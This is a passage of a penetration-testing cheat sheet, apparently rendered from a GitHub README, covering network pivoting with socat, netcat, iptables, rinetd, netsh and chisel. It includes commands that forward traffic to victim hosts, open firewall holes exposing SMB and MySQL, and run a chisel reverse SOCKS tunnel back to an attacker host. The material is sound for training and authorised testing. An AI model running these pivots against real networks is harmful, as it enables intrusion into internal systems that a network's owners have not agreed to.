2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOn the jump-box:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# basic port forwarding with socat listener\nsudo socat -dd TCP-LISTEN:80,fork TCP:REMOTE_HOST_IP:80\n# optionally, do same thing bound to specific interface IP\nsudo socat -dd TCP-LISTEN:80,bind=10.0.0.2,fork TCP:REMOTE_HOST_IP:80\n\n# UDP relay\nsocat -dd -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978\n\n# IPv4 to IPv6 tunnel\nsudo socat -dd TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'\n\n# TCP to Unix Domain Socket\nsocat -dd TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo\n# more secure version\nsocat -dd TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e basic port forwarding with socat listener\u003c/span\u003e\nsudo socat -dd TCP-LISTEN:80,fork TCP:REMOTE_HOST_IP:80\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e optionally, do same thing bound to specific interface IP\u003c/span\u003e\nsudo socat -dd TCP-LISTEN:80,bind=10.0.0.2,fork TCP:REMOTE_HOST_IP:80\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e UDP relay\u003c/span\u003e\nsocat -dd -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e IPv4 to IPv6 tunnel\u003c/span\u003e\nsudo socat -dd TCP-LISTEN:110,reuseaddr,fork \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eTCP6:[fe80::dead:beef%eth0]:110\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e TCP to Unix Domain Socket\u003c/span\u003e\nsocat -dd TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e more secure version\u003c/span\u003e\nsocat -dd TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eGeneral socat syntax\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"socat [options] \u0026lt;address\u0026gt; \u0026lt;address\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003esocat [options] \u0026lt;address\u0026gt; \u0026lt;address\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhere \u003ccode\u003e\u0026lt;address\u0026gt;\u003c/code\u003e is in the form \u003ccode\u003eprotocol:ip:port\u003c/code\u003e or \u003ccode\u003efilename\u003c/code\u003e or \u003ccode\u003eshell-cmd\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOther useful addresses:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003eSTDIN\u003c/code\u003e (equivalently, \u003ccode\u003e-\u003c/code\u003e), \u003ccode\u003eSTDOUT\u003c/code\u003e, and \u003ccode\u003eSTDIO\u003c/code\u003e (both stdin and stdout)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eEXEC:cmdline\u003c/code\u003e or \u003ccode\u003eSYSTEM:shell-cmd\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eFILE:/path/to/file\u003c/code\u003e - log output to file\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eFILE:$(tty),rawer\u003c/code\u003e - a raw terminal\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePTY,link=/tmp/mypty,rawer,wait-slave\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eUDP:host:port\u003c/code\u003e and \u003ccode\u003eUDP-LISTEN:port\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eTCP:host:port\u003c/code\u003e and \u003ccode\u003eTCP-LISTEN:port\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eOPENSSL:host:port\u003c/code\u003e and \u003ccode\u003eOPENSSL-LISTEN:host:port\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eUNIX-CONNECT:filename\u003c/code\u003e and \u003ccode\u003eUNIX-LISTEN:filename\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePIPE\u003c/code\u003e or \u003ccode\u003ePIPE:filename\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.5 Bending with netcat\u003c/h2\u003e\u003ca id=\"user-content-85-bending-with-netcat\" class=\"anchor\" aria-label=\"Permalink: 8.5 Bending with netcat\" href=\"#85-bending-with-netcat\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNetcat combined lets you do traffic bending. It's a crude (but effective) tool.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# WINDOWS pivot\n# enter temporary directory to store relay.bat\ncd %temp%\n# create relay.bat to connect to victim service\necho nc $VICTIM_IP VICTIM_PORT \u0026gt; relay.bat\n# Set up pivot listener (-L is persistent listener)\nnc L -p LISTEN_PORT e relay.bat\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e WINDOWS pivot\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enter temporary directory to store relay.bat\u003c/span\u003e\ncd \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003etemp\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create relay.bat to connect to victim service\u003c/span\u003e\necho nc \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e VICTIM_PORT \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003erelay.bat\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Set up pivot listener (-L is persistent listener)\u003c/span\u003e\nnc L \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep LISTEN_PORT e \u003cspan class=\"pl-c1\"\u003erelay.bat\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# LINUX pivot\n# requires named pipe to join sender \u0026amp; receiver\nmkfifo /tmp/bp  # backpipe\nnc lnp LISTEN_PORT 0\u0026lt;bp | nc $VICTIM_IP VICTIM_PORT | tee bp\n# 'tee' lets you inspect bytes on the wire\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e LINUX pivot\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e requires named pipe to join sender \u0026amp; receiver\u003c/span\u003e\nmkfifo /tmp/bp  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e backpipe\u003c/span\u003e\nnc lnp LISTEN_PORT \u003cspan class=\"pl-k\"\u003e0\u0026lt;\u003c/span\u003ebp \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e nc \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e VICTIM_PORT \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tee bp\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e 'tee' lets you inspect bytes on the wire\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.6 Bending with iptables\u003c/h2\u003e\u003ca id=\"user-content-86-bending-with-iptables\" class=\"anchor\" aria-label=\"Permalink: 8.6 Bending with iptables\" href=\"#86-bending-with-iptables\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIptables forwarding requires \u003ccode\u003eroot\u003c/code\u003e privileges.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eHere's how to do traffic shaping to redirect traffic on port 80 through a pivot\nhost to your desired remote host. Note, it's usually also good practice to\nspecify the interface for iptables rules with \u003ccode\u003e-i eth0\u003c/code\u003e or whatever.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# allow inbound traffic on tcp port 80\nsudo iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n# NAT the traffic from server's port 80 to remote host port 80 (changing dest addr)\nsudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTE_HOST_IP:80\n# enable NAT'ing on outbound traffic (changing source addr)\nsudo iptables -t nat -A POSTROUTING -j MASQUERADE\n# allow forwarding traffic through iptables\nsudo iptables -I FORWARD -j ACCEPT\n# default policy to allow forwarding\nsudo iptables -P FORWARD ACCEPT\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e allow inbound traffic on tcp port 80\u003c/span\u003e\nsudo iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NAT the traffic from server's port 80 to remote host port 80 (changing dest addr)\u003c/span\u003e\nsudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTE_HOST_IP:80\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enable NAT'ing on outbound traffic (changing source addr)\u003c/span\u003e\nsudo iptables -t nat -A POSTROUTING -j MASQUERADE\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e allow forwarding traffic through iptables\u003c/span\u003e\nsudo iptables -I FORWARD -j ACCEPT\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e default policy to allow forwarding\u003c/span\u003e\nsudo iptables -P FORWARD ACCEPT\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: to forward IP packets (when using \u003ccode\u003eMASQUERADE\u003c/code\u003e or \u003ccode\u003eSNAT\u003c/code\u003e), you must first enable it in the kernel via:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Enable ip forwarding in kernel permanently (fwding req'd for MASQUERADE/SNAT)\nsudo sysctl -w net.ipv4.ip_forward=1\n# -- or temporarily until reboot --\necho 1 | sudo tee /proc/sys/net/ipv4/ip_forward\n# or /proc/sys/net/ipv4/conf/IFNAME/forwarding\n\n# make iptables rules persistent (optional)\nsudo service iptables-persistent save\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Enable ip forwarding in kernel permanently (fwding req'd for MASQUERADE/SNAT)\u003c/span\u003e\nsudo sysctl -w net.ipv4.ip_forward=1\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -- or temporarily until reboot --\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e 1 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e sudo tee /proc/sys/net/ipv4/ip_forward\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or /proc/sys/net/ipv4/conf/IFNAME/forwarding\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make iptables rules persistent (optional)\u003c/span\u003e\nsudo service iptables-persistent save\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.7 Bending with rinetd\u003c/h2\u003e\u003ca id=\"user-content-87-bending-with-rinetd\" class=\"anchor\" aria-label=\"Permalink: 8.7 Bending with rinetd\" href=\"#87-bending-with-rinetd\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBetter suited for \u003cstrong\u003elong-term\u003c/strong\u003e redirections.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOnce installed (\u003ccode\u003eapt install -y rinetd\u003c/code\u003e), you can easily specify rinetd forwarding rules by changing the config settings in \u003ccode\u003e/etc/rinetd.conf\u003c/code\u003e. \u003ccode\u003erinetd\u003c/code\u003e acts as a persistently-running service that does redirection.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eRedirection rules are in the following format:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"bindaddress bindport connectaddress connectport\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ebindaddress bindport connectaddress connectport\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThe \u003ccode\u003ekill -1\u003c/code\u003e signal (\u003ccode\u003eSIGHUP\u003c/code\u003e) can be used to cause rinetd to reload its configuration file without interrupting existing connections. Under Linux the process id is saved in the file \u003ccode\u003e/var/run/rinetd.pid\u003c/code\u003e to facilitate the \u003ccode\u003ekill -HUP\u003c/code\u003e. Or you can do a hard restart via \u003ccode\u003esudo service rinetd restart\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.8 Bending with netsh on Windows\u003c/h2\u003e\u003ca id=\"user-content-88-bending-with-netsh-on-windows\" class=\"anchor\" aria-label=\"Permalink: 8.8 Bending with netsh on Windows\" href=\"#88-bending-with-netsh-on-windows\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you own a dual-homed internal Windows box that you want to pivot from, you\ncan set up port forwarding using the \u003ccode\u003enetsh\u003c/code\u003e utility.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: Requires Administrator privileges.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# NOTE: before you start, make sure IP Helper service is running\n\n# establish IPv4 port forwarding from windows external IP to internal host\nnetsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_VICTIM_IP\n# example opening mysql connections to the outside on port 33066\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33066 connectaddress=127.0.0.1 connectport=3306\n\n# confirming your port forwarding rule was added:\nnetsh interface portproxy show all\n\n# confirming your port is actually listening:\nnetstat -anp TCP | findstr \u0026quot;4445\u0026quot;\n\n# you also need to open a firewall rule to allow your inbound traffic (4445 in example)\n# note: if you want to restrict it to a specific interface IP, add \u0026quot;localip=EXT_WIN_IP\u0026quot;\nnetsh advfirewall firewall add rule name=\u0026quot;derp\u0026quot; protocol=TCP dir=in action=allow localport=4445\n\n# on kali, check port is \u0026quot;open\u0026quot;, not \u0026quot;filtered\u0026quot;\nsudo nmap -T4 -sS -Pn -n -p4445 WINDOWS_IP\n\n# removing firewall hole:\nnetsh advfirewall firewall delete rule name=\u0026quot;derp\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NOTE: before you start, make sure IP Helper service is running\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e establish IPv4 port forwarding from windows external IP to internal host\u003c/span\u003e\nnetsh interface portproxy add v4tov4 listenport\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e4445\u003c/span\u003e listenaddress\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e0.0\u003c/span\u003e connectport\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e445\u003c/span\u003e connectaddress\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003eINTERNAL_VICTIM_IP\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e example opening mysql connections to the outside on port 33066\u003c/span\u003e\nnetsh interface portproxy add v4tov4 listenaddress\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e0.0\u003c/span\u003e listenport\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e33066\u003c/span\u003e connectaddress\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e0.1\u003c/span\u003e connectport\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3306\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e confirming your port forwarding rule was added:\u003c/span\u003e\nnetsh interface portproxy show all\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e confirming your port is actually listening:\u003c/span\u003e\nnetstat \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eanp TCP \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e4445\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you also need to open a firewall rule to allow your inbound traffic (4445 in example)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e note: if you want to restrict it to a specific interface IP, add \"localip=EXT_WIN_IP\"\u003c/span\u003e\nnetsh advfirewall firewall add rule name\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e protocol\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003eTCP dir\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e action\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003eallow localport\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e4445\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali, check port is \"open\", not \"filtered\"\u003c/span\u003e\nsudo nmap \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eT4 \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esS \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePn \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003en \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep4445 WINDOWS_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e removing firewall hole:\u003c/span\u003e\nnetsh advfirewall firewall delete rule name\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ederp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.9 Bending with chisel\u003c/h2\u003e\u003ca id=\"user-content-89-bending-with-chisel\" class=\"anchor\" aria-label=\"Permalink: 8.9 Bending with chisel\" href=\"#89-bending-with-chisel\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/jpillora/chisel\"\u003eChisel\u003c/a\u003e lets you securely tunnel using HTTP as a transport, allowing you to get through Deep Packet Inspection (DPI) firewalls to forward ports or set up a SOCKS proxy.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eNOTE\u003c/strong\u003e: The chisel installed on Kali doesn't always play nice with other Linux hosts. Always download the client binary from the repo!\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/jpillora/chisel/releases/latest\"\u003eChisel Releases Page\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe most common way to use it is as a Reverse SOCKS proxy (reference: \u003ca href=\"https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29\" rel=\"nofollow\"\u003eReverse SOCKS guide\u003c/a\u003e). Example of Reverse SOCKS proxy setup:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on attack box\n# start reverse socks proxy server on port 8080:\n./chisel server -p 8000 --reverse\n\n# grab windows chisel.exe binary from:\n# https://github.com/jpillora/chisel/releases/latest/\n\n# on jumpbox (Windows example), set up reverse SOCKS proxy\n.\\chisel-x64.exe client attacker_ip:8000 R:socks\n\n# then use proxychains from attack box like normal\n\n# to do reverse port forwarding so kali can reach internal address,\n# add the following to the previous command:\nR:2222:VICTIM_IP:22\n\n# to tunnel ssh through a SOCKS proxy without proxychains:\nssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:8000 %h %p' victim@VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on attack box\u003c/span\u003e\n\u003cspan 